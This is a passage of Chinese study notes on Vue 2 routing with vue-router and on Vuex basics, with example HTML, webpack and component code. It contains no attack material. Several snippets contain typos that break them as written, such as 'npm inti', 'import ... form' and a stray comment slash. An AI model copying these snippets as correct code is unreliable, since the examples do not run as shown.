    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
    <script src="../js/vue-router.js"></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <!-- 
                router-link支持用户在具有路由功能的应用中
                导航，to属性指定目标地址，默认渲染成带有
                正确链接的<a>标签，此处通过配置tag属性生成span
                标签
                router-view用来当作占位符使用，将路由规则
                匹配到的组件展示到其中
             -->
             <router-link to="/login" tag="span">前往登录</router-link>
             <router-view></router-view>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建login组件
                var login = {
                    template: '<h1>登录组件</h1>',
                }
                var routerObj = new VueRouter({
                    routes:[
                        // 配置路由匹配规则,
                        // path表示监听哪个路由链接地址，
                        // component表示如果路由是前面匹配到的path则展示该组件
                        {path:'/login', component:login}
                    ]
                })
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        router:routerObj // 将路由规则对象注册到vm实例上
                })
        </script>
</body>
</html>
```

​	以上方面默认使用的是hash模式，如果在`routerObj`中添加` mode:'history'`就变成了history模式，该模式下没有#前缀：

```vue
var routerObj = new VueRouter({
                    routes:[
                        {path:'/login', component:login}
                    ],
                    mode:'history'
 })
```



#### 5.2.3.路由对象属性

​	路由对象（route object）表示当前激活的路由的状态信息，包含了当前URL解析得到的信息，还有URL匹配到的路由记录。路由对象是不可变的，每次成功地导航后都会产生一个新的对象。

​	`this.$router`表示全局路由器对象，项目中通过router路由参数注入路由之后，在任何一个页面都可以通过此属性获取到路由器对象，并调用其`push()`、`go()`等方法。`this.$route`表示当前正在用于跳转的路由器对象，可以访问其`name、path、query、params`等属性。

​	路由对象`$route`的常用属性信息如下：

| 属性名                | 类型   | 说明                                                         |
| --------------------- | ------ | ------------------------------------------------------------ |
| $route.path           | String | 对应当前路由的名字                                           |
| $route.query          | Object | 一个{key:value}对象，表示 URL查询参数                        |
| $route.params         | Object | 一个{key:value}对象，路由转跳携带参数                        |
| $route.hash           | String | 在history模式下获取当前路由的hash值（带#），如果没有hash值，则为空字符串 |
| $route.fullPath       | String | 完成解析后的URL，包含查询参数和hash的完整路径                |
| $route.name           | String | 当前路由的名称                                               |
| $route.matched        | Array  | 路由记录，当前路由下路由声明的所有信息，从父路由（如果有）到当前路由为止 |
| $route.redirectedFrom | String | 如果存在重定向，即为重定向来源的路由                         |



### 5.3.用户登录注册案例

​	结构：

```txt
|-index.html       	    // 首页入口文件
|-components      	    // 存放vue组件
     |-Login.vue          // 登录组件
     |-Register.vue      // 注册组件
|-lib		    // 存放库文件
|-App.vue          	    // vue文件，推荐使用首字母大写来命名
|-main.js          	    // 程序逻辑入口文件
|-router.js        	    // 路由文件
|-package.json    	    // 工程文件，记录需要的依赖包
|-webpack.config.js //webpack配置文件
```

#### 5.3.1.环境配置

- **创建login目录，在该目录下运行以下命令，生成一个`package.json`的工程文件：**

```shell
npm inti -y
```

- **安装vue和vue-router，生成一个`package-lock.json`的文件：**

```shell
npm install vue@2.7.x vue-router@3.1.x
```

- **安装webpack：**

```shell
npm install webpack@4.39.x webpack-cli@3.3.x webpack-dev-server@3.8.x html-webpack-plugin@3.2.x -D
```

​	然后修改`package.json`文件，在`scripts`中添加`dev`，使用`webpack-dev-server`来启动项目：

```javascirpt
"scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "dev":"webpack-dev-server --inline --hot --port 8088"
},
```

- **安装vue-loader和vue-template-compiler**：`vue-loader`的作用分别是解析和转换vue文件，提取其中的script、style、HTML、template，然后分别把它们交给各自对应的loader去处理；`vue-template-compiler`的作用是把vue-loader提取的HTML模板编译成对应可执行的JS代码：

```shell
npm install vue-loader vue-template-compiler -D
```



- **编写webpack.config.js文件**：设置入口文件、出口文件以及一些规则配置：

```javascript
const htmlWebpackPlugin = require('html-webpack-plugin')
const VueLoaderPlugin = require('vue-loader/lib/plugin')

module.exports = {
  entry: './main.js', 		    	// 配置入口文件
  output: { 						        // 配置输出文件
    path: __dirname, 		       	// 输出文件的路径，此处设为当前路径
    filename: 'bundle.js',    	// 指定输出的文件名称
  },
  resolve: {			 			        // 其他的配置选项
    alias: {
      'vue': 'vue/dist/vue.js'	// vue.js文件路径配置
    }
  },
  devServer: {
    historyApiFallback: true	  // 开启服务器对history模式支持
  },
  module: {
    rules: [				          	// 模块规则
      {
        test: /\.vue$/,
        use: 'vue-loader'
      },
      {
        test: /\.css$/,
        use: ['style-loader', 'css-loader']
      },
      {
        test: /\.less$/,
        use: ['style-loader', 'css-loader', 'less-loader']
      },
      {
        test: /\.scss$/,
        use: ['style-loader', 'css-loader', 'sass-loader']
      },
      {
        test: /\.(jpg|png|gif|bmp|jpeg)$/,
        use: 'url-loader'
      },
      {
        test: /\.(ttf|eot|svg|woff|woff2)$/,
        use: 'url-loader'
      }      
      // 在此处可以添加更多rules
    ]
  }, 
  plugins: [				         		// 插件
    new htmlWebpackPlugin({
      template: 'index.html'		// 为index.html自动引入打包好的bundle.js
    }),
    new VueLoaderPlugin()
  ]
}
```

- **安装css-loader和style-loader**：这两个依赖用来处理样式文件。css-loader用于加载由vue-loader提取出的CSS文件，再用style-loader添加到页面中：

```shell
npm install css-loader@3.2.x style-loader@1.0.x -D
```

- **安装CSS预处理器：**CSS预处理器可以使用专门的语言来编写页面样式，然后编译成正常的CSS文件,Vue中常用的CSS预处理器有Less、Sass/SCSS和Stylus。

1.安装less：

```shell
npm install --save less less-loader@5
```

​	安装后，在页面中使用less的地方添加如下代码即可：

```css
<style lang="less"></style>
```

​	下面的两个预处理器也是一样，只需要修改`lang`属性为`scss`和`stylus`。

2.安装Sass/SCSS：

```shell
npm install sass-loader@7.2.x node-sass@4.12.x -D
# 如果下载报错或缓慢，可使用以下方式
npm install -g cnpm --registry=https://registry.npm.taobao.org
cnpm i node-sass
cnpm i sass-loader
```

3.安装Stylus：

```shell
cnpm install stylus stylus-loader
```

- **安装MUI：**MUI是一款接近原生APP体验的高性能前端框架。参考<a href="https://dev.dcloud.net.cn/mui/getting-started/">官方文档</a>，下载文件放到lib\mui目录中，并在`main.js`中引入MUI：

```javascript
import './lib/mui/css/mui.css'
```

- **安装图片和字体文件处理：**

```shell
cnpm install url-loader@2.1.x file-loader@4.2.x -D
```



#### 5.3.2.代码实现

- 在根目录下创建index.html，该文件是首页，用来展示页面：

```html
<body>
    <div id="app"></div>
</body>
```

- 编写逻辑入口，在根目录下创建mian.js，并引入依赖：

```javascript
import Vue form 'vue'
import app form './App.vue'
import VueRouter  form 'vue-router'
Vue.use(VueRouter)
import router from './router.js'
new Vue({
    el:'#app',
    render:c => c(app),
    router
})
```

- 编写路由文件，在根目录下创建router.js文件：

```javascript
import VueRouter from 'vue-router'

// 导入登录和注册对应的路由组件
import Login from './components/Login.vue'
import Register from './components/Register.vue'

var router = new VueRouter({	              // 创建路由对象
  mode: 'history',                        	// 使用history模式
  routes: [						                      // 配置路由规则
    { path: '/', redirect: '/login' },
    { path: '/login', component: Login, meta: { title: '登录' } },
    { path: '/register', component: Register, meta: { title: '注册' } }
  ]
})

export default router

```

- 渲染路由组件，在根目录下创建App.vue：

```vue
<template>
    <div id="app">
      <div class="login-container">
        <router-link to="/login" tag="span">登录</router-link>
        <router-link to="/register" tag="span">注册</router-link>
      </div>
      <router-view></router-view>
    </div>
</template>
  
<style lang="scss" scoped>
    .login-container {
      display: flex;
      justify-content: center;
      padding-top: 10px;
      span {
        padding: 5px 20px;
        border-radius: 5px;
        font-size: 16px;
      }
    }
</style>
```

- 创建components\Login.vue文件，该文件是登录页面：

```vue
<template>
  <div class="login">
    <div class="content">
      <form class="mui-input-group login-form">
        <div class="mui-input-row">
          <label>账号</label>
          <input type="text" class="mui-input-clear mui-input" placeholder="请输入账号">
        </div>
        <div class="mui-input-row">
          <label>密码</label>
          <input type="password" class="mui-input-clear mui-input" placeholder="请输入密码">
        </div>
      </form>
      <div class="mui-content-padded">
        <button type="button" class="mui-btn mui-btn-block mui-btn-primary">登录</button>
      </div>
    </div>
  </div>
</template>

<script>
export default {
  data () {
    return {}
  }
}
</script>

<style scoped>
  .login-form {
    margin: 30px 0;
    background-color: transparent;
  }
  .mui-input-group .mui-input-row {
    margin-bottom:10px;
    background:#fff;
  }
  .mui-btn-block {
    padding: 10px 0;
  }
</style>
```

- 创建components\Register.vue文件，该文件是注册页面：

```vue
<template>
  <div class="register">
    <div class="content">
      <form class="mui-input-group login-form">
        <div class="mui-input-row">
          <label>账号</label>
          <input type="text" class="mui-input-clear mui-input" placeholder="请输入账号">
        </div>
        <div class="mui-input-row">
          <label>密码</label>
          <input type="password" class="mui-input-clear mui-input" placeholder="请输入密码">
        </div>
        <div class="mui-input-row">
          <label>密码确认</label>
          <input type="password" class="mui-input-clear mui-input" placeholder="请确认密码">
        </div>
        <div class="mui-input-row">
          <label>邮箱</label>
          <input type="password" class="mui-input-clear mui-input" placeholder="请输入邮箱">
        </div>
      </form>
      <div class="mui-content-padded">
        <button type="button" class="mui-btn mui-btn-block mui-btn-primary">注册</button>
      </div>
    </div>
  </div>
</template>

<script>
export default {
  data () {
    return {}
  }
}
</script>

<style scoped>
  .register-form {
    margin: 30px 0;
    background-color: transparent;
  }
  .mui-input-group .mui-input-row {
    margin-bottom:10px;
    background:#fff;
  }
  .mui-btn-block {
    padding: 10px 0;
  }
</style>
```

- 运行项目，在根目录下输入以下命令：

```vue
npm run dev
```



### 5.4.动态路由

​	上面讲到的路由，都是严格定义匹配好的，只有router-link中的to属性和JavaScript中定义的路由中的path一样时，才会显示对应的component。但在实际开发时，这种方式是明显不足的，例如，在不同角色登录网站时，在去配置路由的时候，需要把用户id作为参数传入，这就需要利用动态路由来实现。在vue-router的路由路径中，可以使用动态路径参数给路径的动态部分匹配不同的id。

```vue
{ path: "/user/:id", component: user }
// :id表示用户id，它就是一个动态的值
```

​	动态路由在来回切换时，由于它们都是指向同一组件，Vue不会销毁再重新创建这个组件，而是复用这个组件。如果想要在组件来回切换时进行一些操作，那就需要在组件内部利用watch来监听`$route`的变化：

```vue
watch: {
  $route (to, from) {
    console.log(to)		// to表示要去的那个组件
    console.log(from)	// from表示从哪个组件过来的
  }
}
```

#### 5.4.1.query传参

​	通过query方式传递参数，使用path属性给定对应的跳转路径（类似于GET请求），在页面跳转的时候，可以在地址栏看到请求参数。

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312261649664.png" alt="image-20231226164851210" style="zoom: 33%;" />

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
    <script src="../js/vue-router.js"></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <!-- 指定目标地址user组件，并使用
            查询字符串的形式把参数id,name传递过去 -->
            <router-link to="/user?id=1&name=杜鑫">登录</router-link>
            <router-view></router-view>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 定义user组件 
                var user = {
                    template: '<h3>id: {{this.$route.query.id}} ' + 
                    'name: {{$route.query.name}}</h3>',
                    created () {					      // 组件的生命周期钩子函数
                        console.log(this.$route)	// 用this.$route来接收参数
                    }
                }
                var router = new VueRouter({
                    routes: [
                        { path: '/user', component: user }
                    ]
                })
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {},
                        router
                })
        </script>
</body>
</html>
```

#### 5.4.2.params传参

​	使用params方式则不需要通过查询字符串传参，通常会搭配路由的history模式，将参数放在路径中或隐藏。

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312261652228.png" alt="image-20231226165218075" style="zoom:33%;" />

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
    <script src="../js/vue-router.js"></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <!-- 指定目标地址user组件，并使用
            查询字符串的形式把参数id,name传递过去 -->
            <router-link to="/user/1/杜鑫">登录</router-link>
            <router-view></router-view>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 定义user组件 
                var user = {
                    template: '<h3>id: {{$route.params.id}} ' + 
                    'name: {{$route.params.name}}</h3>',
                    created () {					      // 组件的生命周期钩子函数
                        console.log(this.$route)	// 用this.$route来接收参数
                    }
                }
                var router = new VueRouter({
                    routes: [
                        { path: '/user/:id/:name', component: user }
                    ]
                })
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {},
                        router
                })
        </script>
</body>
</html>
```

### 5.5.动态路由

​	是否是嵌套路由主要是由页面结构来决定的，实际项目中的应用界面，通常由多层嵌套的组件组合而成。简而言之，嵌套路由就是在路由里面嵌套它的子路由。

​	嵌套子路由的关键属性是children，children也是一组路由，相当于前面讲到的routes，children可以像routes一样的去配置路由数组。每一个子路由里面可以嵌套多个组件，子组件又有路由导航和路由容器。

```html
<router-link to="/父路由的地址/要去的子路由"></router-link>
```

​	当使用children属性实现子路由时，子路由的path属性前不要带“/”，否则会永远以根路径开始请求，这样不方便用户去理解URL地址：

```javascript
var router = new VueRouter({
  routes: [{
      path: '/home',
      component: home,
      children: [ // 子路由
        { path: 'login', component: login },
        { path: 'register', component: register }] 
  }]
})
```



​	案例：页面打开后会自动重定向到about组件（关于公司），在该页面下有两个子页面，分别是”公司简介“和”公司治理“：

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312261709775.png" alt="image-20231226170950662" style="zoom:50%;" />

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
    <script src="../js/vue-router.js"></script>
    <style>
        ul, li, h1 {
          padding: 0;
          margin: 0; 
          list-style: none
        }
        #app {
          width: 100%;
          display: flex;
          flex-direction: row;
        }
        ul {
          width: 200px;
          flex-direction: column;
          color: #fff;
        }
        li {
          flex: 1;
          background: #000;
          margin:5px auto;
          text-align: center;
          line-height: 30px;
        }
        .about-detail {
          flex:1;
          margin-left: 30px;
        }
        .about-detail h1{
          font-size: 24px;
          color: blue;
        }
    </style>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <ul>
                <router-link to="/about" tag="li">关于公司</router-link>
                <router-link to="/contact" tag="li">联系我们</router-link>
            </ul>
            <router-view></router-view>
        </div>
        <!-- 定义子组件模板 -->
        <template id="about-tmp">
            <div class="about-detail">
              <h1>甲骨文OAEC教学中心</h1>
              <router-link to="/about/detail">公司简介</router-link> |
              <router-link to="/about/governance">公司治理</router-link>
              <router-view></router-view>
            </div>
        </template>

        <template id="contact-tmp">
            <div class="about-detail">
              <h1>联系我们</h1>
              <p>上海市静安区万荣路777号大宁音乐广场H座</p>
            </div>
        </template>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 组件的模板对象
                var about = { template: '#about-tmp' }
                var contact = { template: '#contact-tmp' }
                // 子路由的组件模板对象
                var detail = {
                    template:'<p>abc教学平台是全球领先的。。。</p>'
                }
                var governance = {
                    template:'<p>公司坚持以客户为中心，以奋斗者为本。。。</p>'
                }

                // 创建路由
                var router = new VueRouter({
                    routes:[
                        {path:'/',redirect:'/about'}, // 路由重定向
                        {
                            path:'/about',
                            component:about,
                            // 子路由
                            children:[
                                {path:'detail',component:detail},
                                {path:'governance',component:governance},
                            ]
                        },
                        {path:'/contact',component:contact}
                    ]
                })
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {},
                        router // 路由挂载
                        
                })
        </script>
</body>
</html>
```

### 5.6.命名路由

​	`vue-router`提供了一种隐式的引用路径，即命名路由，可以在创建Router实例的时候，在 routes 中给某个路由设置名称name值。通过一个名称来标识一个路由显得更方便一些，特别是在链接一个路由，或者是执行一些跳转的时候，通过路由的名称取代路径地址直接使用。像这种命名路由的方式，无论path多长、多烦琐，都能直接通过name来引用，十分方便。

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312261714524.png" alt="image-20231226171454364" style="zoom: 33%;" />

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
    <script src="../js/vue-router.js"></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <!-- name表示组组件名，params表示传参id -->
            <router-link :to="{name:'user',params:{id:123}}">登录</router-link>
            <router-view></router-view>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建user组件
                var user = {
                    template: '<h3>我是user组件</h3>',
                    created () {
                        console.log(this.$route)
                    }
                }
                // 创建路由对象
                var router = new VueRouter({
                    routes: [{
                        path: '/user/:id', 
                        name: 'user',
                        component: user
                    }]
                })
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {},
                        router
                })
        </script>
</body>
</html>
```

### 5.7.命名视图

​	在开发中，有时候想同时或同级展示多个视图，而不是嵌套展示，则可以在页面中定义多个单独命名的视图。使用`<router-view>`可以为视图进行命名，它主要用来负责路由跳转后组件的展示。在`<router-view>`上定义name属性表示视图的名字，然后就可以根据不同的name值展示不同的页面，如left、main等。如果`<router-view>`没有设置名字，那么默认为default。

![image-20231226210412313](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312262104490.png)

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
    <script src="../js/vue-router.js"></script>
    <style>
        html, body {
          margin: 0;
          padding: 0;
        }
        h1 {
          margin: 0;
          padding: 0;
          font-size: 16px;
        }
        .header {
          background-color: lightblue;
          height: 80px;
        }
        .container {
          display: flex;
          height: 600px;
        }
        .sidebar {
          background-color: lightgreen;
          flex: 2;
        }
        .main {
          background-color: lightpink;
          flex: 8;
        }
    </style>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <!-- 默认渲染 -->
            <router-view></router-view>
            <div class="container">
                <!-- 渲染对应的组件 -->
                <router-view name="left"></router-view>
                <router-view name="main"></router-view>
            </div>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                var header = { template: '<h1 class="header">header头部区域</h1>' }
                var sidebar = { template: '<h1 class="sidebar">sidebar侧导航区域</h1>' }
                var mainBox = { template: '<h1 class="main">mainBox主体区域</h1>' }
                var router = new VueRouter({
                    routes: [{
                        path: '/',
                        components: {
                        'default': header,
                        'left': sidebar,
                        'main': mainBox
                        }
                    }]
                })
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {},
                        router
                        
                })
        </script>
</body>
</html>
```

### 5.8.编程式导航

​	在前面的开发中，当进行页面切换时，都是通过<router-link>来实现的，这种方式属于声明式导航。为了更方便地在项目中开发导航功能，Vue提供了编程式导航，也就是利用JavaScript代码来实现地址的跳转，通过router实例方法来实现。

#### 5.8.1.router.push()

​	使用`router.push()`方法可以导航到不同的URL地址。这个方法会向`history`栈添加一条新的记录，当用户单击浏览器后退按钮时，可以回到之前的URL。

​	在单击`<router-link>`时，`router.push()`方法会在内部调用，也就是说，单击`“<route-link :to="...">”`等同于调用`router.push(...)`方法。

​	`router.push()`方法的参数可以是一个字符串路径，或者是一个描述路径的对象。

```vue
// 先获取router实例
var router = new VueRouter()
// 字符串形式
router.push('user')
// 对象形式
router.push({ path: '/login?url=' + this.$route.path })
// 命名路由
router.push({ name: 'user', params: { userId: 123 }})
// 带查询参数 /user?id=1
router.push({ path: 'user', query: { id: '1' }})
```

​	在参数对象中，如果提供了path，params会被忽略，为了传参数，需要提供路由的name或者手写带有参数的path。

```vue
const userId = '123'
router.push({ name: 'user', params: { userId }})  // /user/123
router.push({ path: `/user/${userId}` })                // /user/123
// 这里的 params 不生效
router.push({ path: '/user', params: { userId }})  // /user
```

- **query传参**

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
    <script src="../js/vue-router.js"></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <button @click="goStart">跳转</button>
            <router-view></router-view>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 定义user组件
                var user = {
                    template: '<p>用户名：{{ this.$route.query.name }}</p>'
                }
                var router = new VueRouter({
                    routes: [
                        { path: '/user', component: user }
                    ]
                })
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {},
                        methods: {
                            goStart () {
                                this.$router.push({ path: '/user', query: { name: 'admin' } })
                            }
                        },
                        router
                        
                })
        </script>
</body>
</html>
```

- **params传参：**

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
    <script src="../js/vue-router.js"></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <button @click="goStart">跳转</button>
            <router-view></router-view>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 定义user组件
                var user = {
                    template: '<p>用户名：{{ this.$route.params.name }}</p>'
                }
                var router = new VueRouter({
                    routes: [
                        { path: '/user', component: user, name:'user'}
                    ]
                })
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {},
                        methods: {
                            goStart () {
                                this.$router.push({ name: 'user', params: { name: 'admin' } })
                            }
                        },
                        router
                        
                })
        </script>
</body>
</html>
```



#### 5.8.2.router.replace()

​	`router.replace()`方法和`router.push()`方法类似，区别在于，为`<router-link>`设置replace属性后，当单击时，就会调用`router.replace()`，导航后不会向history栈添加新的记录，而是替换当前的history记录。

```vue
/ 编程式
router.replace({ path: 'user' })
// 声明式
<router-link :to="{path:'user'}" replace></router-link>
```

#### 5.8.3.router.go()

​	`router.go()`方法的参数是一个整数，表示在history历史记录中向前或者后退多少步，类似于`window.history.go()`。`this.$router.go(-1)`相当于`history.back()`，表示后退一步，`this.$router.go(1)`相当于`history.forward()`，表示前进一步，功能类似于浏览器上的后退和前进按钮，相应的地址栏也会发生改变。

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
    <script src="../js/vue-router.js"></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <button @click="goBack">后退</button>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                var router = new VueRouter()
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {},
                        methods: {
                            goBack () {
                                this.$router.go(-1)   // 使用this.$router.go()进行后退操作
                            }
                        },
                        router
                        
                })
        </script>
</body>
</html>
```

​	可以创建一个测试页面，用路由或超链接跳转到以上代码页面，跳转后点击“后退”，浏览器就会执行后退操作。



## 6.Vuex状态管理

### 6.1.Vuex初体验

​	Vuex是Vue团队提供的一套组件状态管理维护的解决方案。Vuex 是一个专为 Vue.js 应用程序开发的**状态管理模式**。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。Vuex 也集成到 Vue 的官方调试工具 [devtools extension (opens new window)](https://github.com/vuejs/vue-devtools)，提供了诸如零配置的 time-travel 调试、状态快照导入导出等高级调试功能。它有以下有点：

- 进一步完善了Vue基础代码功能
- 使Vue组件状态更加容易维护
- 为大型项目开发提供了强大的技术支持



​	Vuex3官网：https://v3.vuex.vuejs.org/zh/

#### 6.1.1.Vuex下载和安装

​	Vuex通常有两种安装方式：一种是通过script标签引入`vuex.js`文件，一种是使用npm安装。

- **vuex.js单文件引入**：从官网下载保存到vuex.js文件，并引入。

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
    <script src="../js/vuex.js"></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <!-- 将state中name的值插入p标签 -->
            <p>{{ this.$store.state.name}}</p>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vuex实例对象store
                var store = new Vuex.Store({
                    state:{
                        name:'vuex.js直接引入'
                    }
                })
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {},
                        store
                })
        </script>
</body>
</html>
```

​	`store`中的状态是响应式的，在组件中调用`store`中的状态时仅需要在计算属性中返回即可，所以上面的代码也可以修改为：

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
    <script src="../js/vuex.js"></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <!-- 将state中name的值插入p标签 -->
            <p>{{name}}</p>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vuex实例对象store
                var store = new Vuex.Store({
                    state:{
                        name:'vuex.js直接引入'
                    }
                })
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {},
                        store,
                        computed:{
                            name() {
                                return this.$store.state.name
                            }
                        }
                })
        </script>
</body>
</html>
```

​	当一个组件需要获取多个状态时，将这些状态都声明为计算属性有些麻烦，这时候可以使用`mapState 辅助函数`来生成计算属性。

```vue
var mapState = Vuex.mapState
var vm = new Vue({
  el: '#app',
  store,
  computed: mapState({
    // 箭头函数可使代码更简短
    name: state => state.name
  }
})
```

- **npm或yarn下载vuex**：命令如下：

```shell
vue init webpack vuex的引入.html
cd vuex的引入.html
# npm安装
npm install vuex --save
# yarn安装
yarn add vuex

# 下载后引入并使用vuex
import Vuex from "vuex"
Vue.use(Vuex)
```



#### 6.1.2.计算器案例

​	每一个Vuex应用的核心就是`store（仓库）`，即响应式容器，它用来定义应用中数据以及数据处理工具。Vuex的状态存储是响应式的，当`store`中数据状态发生变化，那么页面中的store数据也发生相应变化。改变store中的状态的唯一途径就是显式地提交`mutation`，这样可以方便地跟踪每一个状态的变化。

![image-20231226223657398](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312262236531.png)

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
    <script src="../js/vuex.js"></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <button @click="increment">+</button>
            <p>{{ this.$store.state.count }}</p>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建store对象
                const store = new Vuex.Store({
                    state: {
                        count: 0
                    },
                    // 修改count的值
                    mutations: {
                        // 接收state初始数据
                        increase (state) {
                            state.count++
                        }
                    }
                })
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {},
                        store,
                        methods: {
                            increment () {
                                // commit()提交状态变更
                                this.$store.commit('increase')
                            }
                        }
                        
                })
        </script>
</body>
</html>
```

#### 6.1.3.Vuex状态管理模式

​	在Vue中，组件的状态是通过Vue单项数据流的设计理念实现的：

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312262239046.png" alt="img" style="zoom: 33%;" />

Vue中的单项数据流主要包含以下3个部分：

- **State**：驱动应用的数据源
- **View**：以声明方式将state映射到视图
- **Action**：响应在View上的用户输入导致的状态变化

Vue的单项数据流增强了组件之间的独立性，但是存在多个组件共享状态的时候，单项数据流状态就会被破坏。为了数据维护更加方便，需要将组件共享状态抽离出来，用全局单例模式来管理。在这种模式下，任何组件都能获取状态或触发行为，这就是所谓的Vuex数据状态管理。Vuex是专门为Vue设计的状态管理库，以利用Vue的细粒度数据响应机制来进行高效的状态更新。

